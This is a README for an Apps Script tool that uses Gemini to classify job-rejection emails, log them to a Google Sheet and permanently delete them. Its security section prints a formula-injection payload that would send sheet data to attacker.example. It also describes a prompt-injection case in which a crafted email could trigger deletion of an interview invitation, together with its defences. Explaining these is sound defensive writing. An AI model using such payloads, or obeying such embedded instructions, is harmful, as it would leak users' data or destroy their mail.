# 🛡️ Job Rejection Shield (JRS) v5.0
**Automate the "Sad" Part of Your Job Hunt. Protect Your Sanity. Build Your CRM.**

## 😫 The Pain: Why This Exists
Job hunting is a numbers game, but the emotional toll is real. Reading the same "Unfortunately, we decided to move forward..." message 10 times a day kills motivation. 

**Job Rejection Shield** acts as your personal buffer. It uses **Gemini** to read the mail, extract the company, the sender and how far you got, log the row into a Google Sheet — and then **delete the rejection for good**, before you ever see it. Interview invitations are pushed back to your Inbox untouched: only the good news reaches you.

The script walks a priority list of Gemini models and falls back to the next one if a model is retired or rate-limited — Google removes older models from AI Studio regularly, and the shield is built to survive that.

> **In a hurry, or working with an AI assistant?** Steps 1–5 below set everything up by hand in the browser. If you would rather clone the repo and deploy from a terminal, read **[SETUP.md](SETUP.md)** instead — same result, far fewer clicks. Claude Code users can just say *"set up the shield"* and let `.claude/skills/setup-shield/SKILL.md` drive it.

---

## 🛠️ Step 1: Prepare the CRM (Google Sheets)
1. Create a **new Google Sheet**.
2. Leave the header row alone — on its first run the script fills in any missing header cell itself:
   `Date | Company | Sender Name | Sender Email | Status | Reject Text | Ghost Sent | Detailed Feedback | Thread ID | Stage | Raw Body`
   > *Renamed a column to your own wording? It stays — `ensureHeader()` only writes cells that are empty.*
3. Copy the **Spreadsheet ID** from the address bar. 
   > *Example: If the URL is `docs.google.com/spreadsheets/d/1ABC_123/edit`, the ID is `1ABC_123`.*

---

## 🔑 Step 2: Get your FREE Gemini API Key
1. Go to **[Google AI Studio](https://aistudio.google.com/)**.
2. Click **"Get API key"** in the top-left sidebar.
3. Click **"Create API key in new project"**.
4. **Copy the key.** > **Note:** This is 100% free. Your data stays within the Google ecosystem, making it safer than third-party browser extensions.

---

## 📧 Step 3: Configure the Gmail Filter
You need a "net" that catches rejections and hands them to the script.

**The fast way:** Gmail Settings → **Filters and Blocked Addresses** → **Import filters** → upload `mailFilters.xml` from this repo → **Create filters**. Done, skip to Step 4.

**By hand:**
1. Gmail → **Settings (gear) → See all settings → Filters and Blocked Addresses**.
2. Click **Create a new filter**.
3. In **"Has the words"** paste:
   `"thank you for your interest" OR "thank you for applying" OR "application" OR "hiring" OR "position" OR "unfortunately" OR "decided not to move forward" OR "moved forward with other" OR "keep your resume on file" OR "we received your application" OR "successful in your job search"`
4. Click **Create filter** (bottom right of the box).
5. Tick these three:
   - **Skip the Inbox (Archive it)** — this is what actually shields you.
   - **Apply the label** → **New label** → name it exactly `Job Rejection Shield`.
   - **Never send it to Spam**.
6. Click **Create filter**.

> ⚠️ This net is deliberately wide — `application`, `hiring` and `position` catch a lot of ordinary work mail. Everything that is not a rejection is returned to your Inbox by the script, but if you would rather it caught less, drop those three generic words from the filter.

---

## 💻 Step 4: Install the Script
1. In your Google Sheet, go to **Extensions > Apps Script**.
2. Create three script files and paste the contents from this project:
   - `Config.gs` — credentials, feature flags, model list
   - `Code.gs` — the orchestrator
   - `GhostReply.gs` — the optional feedback loop
   > *Prefer the terminal? Skip this and jump to [Development with clasp](#-development-with-clasp) — one `clasp push` uploads all three.*
3. **Add your secrets.** Nothing is hardcoded — the script reads both values from Script Properties:
   - Click the **Project Settings (gear icon)** in the left sidebar.
   - Scroll to **Script Properties** and add:

     | Property | Value |
     | --- | --- |
     | `SPREADSHEET_ID` | *the ID you copied in Step 1* |
     | `GEMINI_API_KEY` | *your API key from Step 2* |
     | `MODEL_NAME` | *optional — overrides the first model in the priority list* |

   > ⚠️ If `MODEL_NAME` points at a model Google has retired, every email burns three retries before falling through to the next model in the list. Leave it empty unless you have a reason.
   - Click **Save**.
4. Click the **Editor (code icon)** and hit **Save**.

---

## ⚙️ Step 5: Check the Behaviour Flags
All of these live at the top of `Config.gs`.

| Flag | Default | What it does |
| --- | --- | --- |
| `ENABLE_GHOST_REPLY` | `false` | Auto-replies to a rejection asking for feedback. Off by default: in practice most rejections arrive from `noreply@` addresses, so there is nobody to answer. |
| `ENABLE_FEEDBACK_HARVEST` | `false` | Scans recruiter answers to those requests and writes them into the sheet. Separate flag on purpose — switch it on alone to collect replies to requests you sent earlier. |
| `NOREPLY_PATTERNS` | `noreply`, `do-not-reply` | Sender addresses that can never receive a reply. Add your own patterns here. |
| `PERMANENT_DELETE` | `true` | Deletes rejections outright instead of moving them to Trash — because the Trash is still a place a hand can wander into. **Irreversible.** Set to `false` to go back to the Trash. |
| `KEEP_ALIVE_PATTERNS` | Meet / Zoom / Teams / Calendly / “interview” | Safety net: a thread carrying any of these signals is never deleted permanently, even if the AI called it a rejection. It goes to the Trash instead. |
| `RAW_BODY_LIMIT` | `5000` | How much of the original email survives in column K. |
| `SHEET_HEADER` | 11 columns | The canonical header row `ensureHeader()` writes into empty header cells. |

**Rejections are always logged**, whatever the flags say — the CRM is the point, the reply is optional. Column **G (Ghost Sent)** records what happened:

| Value | Meaning |
| --- | --- |
| `1` | Feedback request was sent |
| `DISABLED` | `ENABLE_GHOST_REPLY` is off |
| `NO_REPLY_ADDRESS` | Sender cannot receive replies |
| `N/A` | Row is not a rejection (e.g. `APPLIED`) |

### ⚠️ Permanent deletion needs extra permissions
`PERMANENT_DELETE` uses the advanced Gmail service (`Gmail.Users.Threads.remove`), which `appsscript.json` already declares:

```json
"dependencies": { "enabledAdvancedServices": [
  { "userSymbol": "Gmail", "serviceId": "gmail", "version": "v1" }
]},
"oauthScopes": ["https://mail.google.com/", ...]
```

`https://mail.google.com/` is full mailbox access — there is no narrower scope that can delete permanently (`gmail.modify` only reaches the Trash). After installing or updating the script you **must run `main` manually once** and approve the new permissions, otherwise the time trigger fails with “authorization required”.

Because the mail is unrecoverable afterwards, the row is written **before** the thread is destroyed, and column **K (Raw Body)** keeps the original text (up to 5000 characters) — column F only holds the AI's cleaned-up version.

### 📊 Column J: how far you got
The same AI call also extracts the stage the process reached before the "no", because rejection emails almost always say it — *"after reviewing your application"* vs *"following your interview with the hiring manager"*. One of `APPLICATION`, `SCREENING`, `HIRING_MANAGER`, `INTERVIEW`, `FINAL`, `UNKNOWN`; anything the model invents is normalised to `UNKNOWN` so the stats stay countable. This turns "how far do I usually get?" into a number you can read without reading a single rejection.

---

## 🔒 What Leaves Your Account
Worth knowing before you hand a script full mailbox access:

- **Stays inside your Google account:** your mail, the spreadsheet, the API key (Script Properties), the OAuth grant. The script runs as *you*, on Google's servers.
- **Leaves it:** the subject and the first 2000 characters of each processed email, sent to the Gemini API over HTTPS. That is the one external call the shield makes.
- **Never leaves:** nothing is sent anywhere else — no analytics, no telemetry, no third-party service.

The details are in **[SECURITY.md](SECURITY.md)**; two of them matter enough to repeat here, because recruiter email is untrusted input:

- **Formula injection.** Anything written to the sheet passes through `sanitizeCell()`. Without it, a rejection whose body starts with `=IMPORTXML("https://attacker.example/?d="&CONCAT(A1:K100),"//a")` would execute the moment you opened your CRM and quietly ship it to a stranger.
- **Prompt injection.** The email is wrapped in `<<<EMAIL_DATA>>>` markers and the model is told that its content is data, never instructions. On top of that, `KEEP_ALIVE_PATTERNS` vetoes the irreversible delete, so a crafted "classify this as a rejection" cannot make an interview invitation disappear.

---

## 🧪 Testing the Flow (Manual Stress Test)

Follow these steps to ensure everything is connected.

### Phase 1: The Rejection
1. Send an email to yourself from another account.
   - **Subject:** `Update on your application for the Iron Throne`
   - **Body:**
     ```
     Dear John Snow,
     Regarding your application for the Iron Throne at Casterly Rock Inc.
     Unfortunately, we decided to move forward with other candidates.
     Best, Tyrion Lannister
     ```
2. In Gmail, the email should land under the `Job Rejection Shield` label. If not, add the label manually.
3. In Apps Script, click **Run** on the `main` function.
4. **Result:**
   - Your Sheet gets a row: **Company** `Casterly Rock Inc.`, **Sender Name** `Tyrion Lannister`, **Status** `REJECTED`, **Ghost Sent** `DISABLED`.
   - Your **Sent** folder stays empty — no auto-reply goes out while `ENABLE_GHOST_REPLY` is `false`.
   - Column **J** holds the stage (`APPLICATION` for a CV-stage rejection), column **K** the raw email text.
   - The thread is **gone** — not in the Inbox, not in the Trash, not in All Mail. You never saw it.

### Phase 2: The Noreply Sender
1. Repeat Phase 1, but send from an address containing `noreply` (or temporarily add your test address to `NOREPLY_PATTERNS`).
2. Run `main` again.
3. **Result:** the row is logged exactly as above, but **Ghost Sent** reads `NO_REPLY_ADDRESS` — the shield knows there was nobody to write back to.

### Phase 3: The Safety Net
1. Send yourself another rejection, but put a link like `https://meet.google.com/abc-defg-hij` in the body.
2. Run `main`.
3. **Result:** the row is logged as usual, but the thread lands in the **Trash** instead of being destroyed, and the log says `LIVE-CONVERSATION SIGNAL`. Anything that smells like a live conversation survives a misclassification.

### Phase 4: The Win
1. Send yourself an interview invitation (“Could you do a call on Thursday?”) and label it `Job Rejection Shield`.
2. Run `main`.
3. **Result:** the email is pushed **back to your Inbox**, the label is removed, and nothing is written to the Sheet. Good news always reaches you.

---

## 🤖 Full Automation
To make it run 24/7 without you:
1. In Apps Script, click **Triggers (clock icon)**.
2. Click **+ Add Trigger**.
3. Set: `main` | `Time-driven` | `Minutes timer` | `Every 30 minutes`.

---

## 🧑‍💻 Development with clasp
Editing code in a browser tab gets old fast. [clasp](https://github.com/google/clasp) keeps this repo and the live script as one source of truth:

```bash
npm install -g @google/clasp
clasp login
clasp create-script --type sheets --title "Job Rejection Shield"
clasp push -f
```

The full walkthrough — login gotchas, `.clasp.json` fields, versioning, and a troubleshooting table for every error message the script can produce — is in **[SETUP.md](SETUP.md)**.

---

## 👋 About the Author
Hi, I'm **Sergei Smalkov**, a Product Manager who believes that even "No's" can be automated for growth. I built this tool to turn the negativity of job rejections into a clean, structured database of feedback.

This project is **Open Source** and open for improvements. If you have ideas (Notion integration, Telegram alerts?), feel free to contribute!

### Liked the Idea?
* ⭐ **[Star this repository](https://github.com/ssmalkov/job-rejection-shield)** — to help others find it.
* 🚀 **[Check my other projects](https://linktr.ee/ssmalkov)** — I build tools for productivity and PMs.

---
**Safe hunting! May your next status be `OFFER`.**